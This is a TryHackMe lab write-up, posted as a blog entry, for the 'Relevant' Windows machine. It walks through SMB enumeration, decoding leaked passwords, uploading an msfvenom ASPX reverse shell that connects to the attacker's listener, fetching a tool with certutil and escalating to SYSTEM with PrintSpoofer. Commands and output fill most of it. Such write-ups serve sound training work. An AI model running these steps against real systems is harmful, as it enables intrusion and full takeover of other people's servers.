@@ -1,0 +1,391 @@
+---
+layout: post
+title: Relevant
+subtitle: TryHackMe Writeup - Relevant
+description: Enumerate SMB to retrieve files and passwords, then upload files to gain a shell.
+image: https://tryhackme-images.s3.amazonaws.com/room-icons/10524728b2b462e8d164efe4e67ed087.jpeg
+optimized_image: https://tryhackme-images.s3.amazonaws.com/room-icons/10524728b2b462e8d164efe4e67ed087.jpeg
+category: tryhackme
+tags:
+  - TryHackMe
+  - Privilege Escalation
+  - SMB Exploitation
+author: Mustafa Altayeb
+date: 2025-09-12 00:00
+paginate: true
+
+---
+
+# Relevant - TryHackMe Writeup
+
+[Relevant](https://tryhackme.com/room/relevant)
+
+---
+
+![Relevant Banner](https://tryhackme-images.s3.amazonaws.com/room-icons/10524728b2b462e8d164efe4e67ed087.jpeg)
+
+## Objectives
+1. Gain initial access to the Windows server using SMB.
+2. Enumerate privilege escalation vectors using manual commands.
+3. Run a script to impersonate a token and gain administrator privileges.
+
+---
+
+## Reconnaissance
+
+### Nmap Scan
+Ran an Nmap scan to identify open ports:
+
+```bash
+💻 T4T4R1S 🌐 | Local IP ➜ 192.168.1.12 | 🥷 VPN IP ➜ 10.14.109.66
+👀 ➜ ~/thm_machines/Relevant nmap -p1-65535 --min-rate 1000 10.10.134.54
+```
+
+**Results**:
+```bash
+PORT      STATE SERVICE
+80/tcp    open  http
+135/tcp   open  msrpc
+139/tcp   open  netbios-ssn
+445/tcp   open  microsoft-ds
+3389/tcp  open  ms-wbt-server
+49663/tcp open  unknown
+49666/tcp open  unknown
+49667/tcp open  unknown
+```
+
+Identified ports: `80, 135, 139, 445, 3389, 49663, 49666, 49667`
+
+Ran a detailed Nmap scan to identify services on these ports:
+
+```bash
+💻 T4T4R1S 🌐 | Local IP ➜ 192.168.1.12 | 🥷 VPN IP ➜ 10.14.109.66
+👀 ➜ ~/thm_machines/Relevant nmap -sCV -p 80,135,445,3389,49663,49666,49667 10.10.134.54
+```
+
+**Results**:
+```bash
+PORT      STATE SERVICE       VERSION
+80/tcp    open  http          Microsoft IIS httpd 10.0
+|_http-server-header: Microsoft-IIS/10.0
+| http-methods: 
+|_  Potentially risky methods: TRACE
+|_http-title: IIS Windows Server
+135/tcp   open  msrpc         Microsoft Windows RPC
+445/tcp   open  microsoft-ds  Windows Server 2016 Standard Evaluation 14393 microsoft-ds (workgroup: WORKGROUP)
+3389/tcp  open  ms-wbt-server Microsoft Terminal Services
+|_ssl-date: 2025-09-13T19:35:16+00:00; 0s from scanner time.
+| ssl-cert: Subject: commonName=Relevant
+| Not valid before: 2025-09-12T19:22:58
+|_Not valid after:  2026-03-14T19:22:58
+| rdp-ntlm-info: 
+|   Target_Name: RELEVANT
+|   NetBIOS_Domain_Name: RELEVANT
+|   NetBIOS_Computer_Name: RELEVANT
+|   DNS_Domain_Name: Relevant
+|   DNS_Computer_Name: Relevant
+|   Product_Version: 10.0.14393
+|_  System_Time: 2025-09-13T19:34:36+00:00
+49663/tcp open  http          Microsoft IIS httpd 10.0
+|_http-server-header: Microsoft-IIS/10.0
+|_http-title: IIS Windows Server
+| http-methods: 
+|_  Potentially risky methods: TRACE
+49666/tcp open  msrpc         Microsoft Windows RPC
+49667/tcp open  msrpc         Microsoft Windows RPC
+Service Info: Host: RELEVANT; OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Host script results:
+| smb-os-discovery: 
+|   OS: Windows Server 2016 Standard Evaluation 14393 (Windows Server 2016 Standard Evaluation 6.3)
+|   Computer name: Relevant
+|   NetBIOS computer name: RELEVANT\x00
+|   Workgroup: WORKGROUP\x00
+|_  System time: 2025-09-13T12:34:40-07:00
+|_clock-skew: mean: 1h24m01s, deviation: 3h07m51s, median: 0s
+| smb2-security-mode: 
+|   3:1:1: 
+|_    Message signing enabled but not required
+| smb-security-mode: 
+|   account_used: guest
+|   authentication_level: user
+|   challenge_response: supported
+|_  message_signing: disabled (dangerous, but default)
+| smb2-time: 
+|   date: 2025-09-13T19:34:38
+|_  start_date: 2025-09-13T19:22:59
+```
+
+**Key Findings**:
+- **Port 80**: Microsoft IIS httpd 10.0
+- **Port 135**: Microsoft Windows RPC
+- **Port 139**: Microsoft Windows NetBIOS-SSN
+- **Port 445**: Windows Server 2016 Standard Evaluation 14393 (workgroup: WORKGROUP)
+- **Port 3389**: Microsoft Terminal Services
+- **Port 49663**: Microsoft IIS httpd 10.0
+- **Ports 49666, 49667**: Microsoft Windows RPC
+
+### Web Enumeration
+Visited the web server on port 80:
+
+![Web Server](/assets/TryHackMeRoomsImage/Relevant/image.png)
+
+### SMB Enumeration
+Enumerated SMB shares:
+
+```bash
+smbclient -L \\\\10.10.134.54
+```
+
+**Results**:
+```bash
+Sharename       Type      Comment
+---------       ----      -------
+ADMIN$          Disk      Remote Admin
+C$              Disk      Default share
+IPC$            IPC       Remote IPC
+nt4wrksv        Disk
+```
+
+**Key Finding**:
+- **nt4wrksv**: Disk accessible without a password.
+
+### Accessing `nt4wrksv` Share
+Connected to the `nt4wrksv` share:
+
+```bash
+smbclient //10.10.134.54/nt4wrksv
+```
+
+**Results**:
+```bash
+Password for [WORKGROUP\root]:
+Try "help" to get a list of possible commands.
+smb: \> ls
+  .                                   D        0  Sat Jul 25 17:46:04 2020
+  ..                                  D        0  Sat Jul 25 17:46:04 2020
+  passwords.txt                       A       98  Sat Jul 25 11:15:33 2020
+
+                7735807 blocks of size 4096. 5135954 blocks available
+```
+
+Found a file named `passwords.txt` and downloaded it using the `get` command.
+
+**Content of `passwords.txt`**:
+```bash
+[User Passwords - Encoded]
+Qm9iIC0gIVBAJCRXMHJEITEyMw==
+QmlsbCAtIEp1dzRubmFNNG40MjA2OTY5NjkhJCQk
+```
+
+The contents appeared to be Base64-encoded. Decoded them:
+
+```bash
+💻 T4T4R1S 🌐 | Local IP ➜ 192.168.115.128 | 🥷 VPN IP ➜ 10.14.109.66
+👀 ➜ ~ cat passwords.txt
+[User Passwords - Encoded]
+Qm9iIC0gIVBAJCRXMHJEITEyMw==
+QmlsbCAtIEp1dzRubmFNNG40MjA2OTY5NjkhJCQk
+💻 T4T4R1S 🌐 | Local IP ➜ 192.168.115.128 | 🥷 VPN IP ➜ 10.14.109.66
+👀 ➜ ~ echo "Qm9iIC0gIVBAJCRXMHJEITEyMw==" | base64 -d
+Bob - !P@$$W0rD!123
+💻 T4T4R1S 🌐 | Local IP ➜ 192.168.115.128 | 🥷 VPN IP ➜ 10.14.109.66
+👀 ➜ ~ echo "QmlsbCAtIEp1dzRubmFNNG40MjA2OTY5NjkhJCQk" | base64 -d
+Bill - Juw4nnaM4n420696969!$$$
+```
+
+**Credentials**:
+- Bob: `!P@$$W0rD!123`
+- Bill: `Juw4nnaM4n420696969!$$$`
+
+These credentials can be used to log in via RDP on port 3389, identified during the Nmap scan. Additionally, based on experience, the SMB share is likely accessible via the web server on port 49663 (from Nmap results).
+
+## Gaining Access
+Created a reverse shell using `msfvenom`:
+
+```bash
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.14.109.66 LPORT=4444 -f aspx -o rev.aspx
+```
+
+Uploaded the shell to the `nt4wrksv` share:
+
+```bash
+💻 T4T4R1S 🌐 | Local IP ➜ 192.168.115.128 | 🥷 VPN IP ➜ 10.14.109.66
+👀 ➜ ~ smbclient //10.10.134.54/nt4wrksv
+Password for [WORKGROUP\root]:
+Try "help" to get a list of possible commands.
+smb: \> put rev.aspx
+putting file rev.aspx as \rev.aspx (13.1 kb/s) (average 13.1 kb/s)
+smb: \>
+```
+
+Set up a listener on port 4444:
+
+```bash
+nc -nlvp 4444
+```
+
+Accessed the shell via the web server on port 49663:
+
+```bash
+http://10.10.134.54:49663/nt4wrksv/rev.aspx
+```
+
+Successfully gained access to the machine:
+
+```bash
+💻 T4T4R1S 🌐 | Local IP ➜ 192.168.115.128 | 🥷 VPN IP ➜ 10.14.109.66
+👀 ➜ ~ nc -nlvp 4444
+listening on [any] 4444 ...
+connect to [10.14.109.66] from (UNKNOWN) [10.10.134.54] 49869
+Microsoft Windows [Version 10.0.14393]
+(c) 2016 Microsoft Corporation. All rights reserved.
+c:\windows\system32\inetsrv>whoami
+whoami
+iis apppool\defaultapppool
+```
+
+## User Flag
+Located the user flag:
+
+```bash
+c:\Users\Bob\Desktop>dir
+ Volume in drive C has no label.
+ Volume Serial Number is AC3C-5CB5
+
+ Directory of c:\Users\Bob\Desktop
+
+07/25/2020  02:04 PM    <DIR>          .
+07/25/2020  02:04 PM    <DIR>          ..
+07/25/2020  08:24 AM                35 user.txt
+               1 File(s)             35 bytes
+               2 Dir(s)  21,034,422,272 bytes free
+
+c:\Users\Bob\Desktop>more user.txt
+THM{fdk4ka34vk346ksxfr21tg789ktf45}
+```
+
+## Privilege Escalation
+
+### System Enumeration
+Checked privileges:
+
+```bash
+c:\Users\Bob\Desktop>whoami /priv
+
+PRIVILEGES INFORMATION
+----------------------
+
+Privilege Name                Description                               State
+============================= ========================================= ========
+SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled
+SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled
+SeAuditPrivilege              Generate security audits                  Disabled
+SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled
+SeImpersonatePrivilege        Impersonate a client after authentication Enabled
+SeCreateGlobalPrivilege       Create global objects                     Enabled
+SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
+```
+
+**Key Finding**:
+- `SeImpersonatePrivilege`: Enabled, indicating a potential privilege escalation vector.
+
+Found a script to exploit this privilege: [PrintSpoofer.exe](https://github.com/dievus/printspoofer).
+
+Set up a web server to transfer the script:
+
+```bash
+python3 -m http.server 8888
+```
+
+Attempted to download the script using `certutil.exe`, but it failed:
+
+```bash
+c:\inetpub\wwwroot>certutil -urlcache -f http://10.14.109.66:8888/PrintSpoofer.exe rev.exe
+****  Online  ****
+CertUtil: -URLCache command FAILED: 0x80072ee4 (WinHttp: 12004 ERROR_WINHTTP_INTERNAL_ERROR)
+CertUtil: An internal error occurred in the Microsoft Windows HTTP Services
+```
+
+Instead, uploaded the script via SMB:
+
+```bash
+💻 T4T4R1S 🌐 | Local IP ➜ 192.168.115.128 | 🥷 VPN IP ➜ 10.14.109.66
+👀 ➜ ~ smbclient \\\\10.10.134.54\\nt4wrksv
+Password for [WORKGROUP\root]:
+Try "help" to get a list of possible commands.
+smb: \> ls
+  .                                   D        0  Sat Sep 13 15:42:34 2025
+  ..                                  D        0  Sat Sep 13 15:42:34 2025
+  myservice.aspx                      A      460  Sat Sep 13 15:39:39 2025
+  passwords.txt                       A       98  Sat Jul 25 11:15:33 2020
+  rev.aspx                            A     3405  Sat Sep 13 15:42:34 2025
+
+                7735807 blocks of size 4096. 5135281 blocks available
+smb: \> put PrintSpoofer.exe
+putting file PrintSpoofer.exe as \PrintSpoofer.exe (67.8 kb/s) (average 67.8 kb/s)
+```
+
+Navigated to the `nt4wrksv` directory to access the script:
+
+```bash
+c:\inetpub\wwwroot>cd nt4wrksv
+
+c:\inetpub\wwwroot\nt4wrksv>dir
+ Volume in drive C has no label.
+ Volume Serial Number is AC3C-5CB5
+
+ Directory of c:\inetpub\wwwroot\nt4wrksv
+
+09/13/2025  01:10 PM    <DIR>          .
+09/13/2025  01:10 PM    <DIR>          ..
+07/25/2020  08:15 AM                98 passwords.txt
+09/13/2025  01:10 PM            27,136 PrintSpoofer.exe
+09/13/2025  12:42 PM             3,405 rev.aspx
+               4 File(s)         31,099 bytes
+               2 Dir(s)  21,034,082,304 bytes free
+```
+
+Ran the script:
+
+```bash
+.\PrintSpoofer.exe -i -c cmd
+[+] Found privilege: SeImpersonatePrivilege
+[+] Named pipe listening...
+[+] CreateProcessAsUser() OK
+Microsoft Windows [Version 10.0.14393]
+(c) 2016 Microsoft Corporation. All rights reserved.
+
+C:\Windows\system32>whoami
+nt authority\system
+```
+
+Successfully escalated to `NT AUTHORITY\SYSTEM`.
+
+## Root Flag
+Located the root flag:
+
+```bash
+C:\Users\Administrator\Desktop>dir
+ Volume in drive C has no label.
+ Volume Serial Number is AC3C-5CB5
+
+ Directory of C:\Users\Administrator\Desktop
+
+07/25/2020  08:24 AM    <DIR>          .
+07/25/2020  08:24 AM    <DIR>          ..
+07/25/2020  08:25 AM                35 root.txt
+               1 File(s)             35 bytes
+               2 Dir(s)  21,034,082,304 bytes free
+
+C:\Users\Administrator\Desktop>more root.txt
+THM{1fk5kf469devly1gl320zafgl345pv}
+```
+
+---
+
+<iframe src="https://tryhackme.com/api/v2/badges/public-profile?userPublicId=3186403" style="border:none;"></iframe>
+
+Follow me through these links:
+
+---
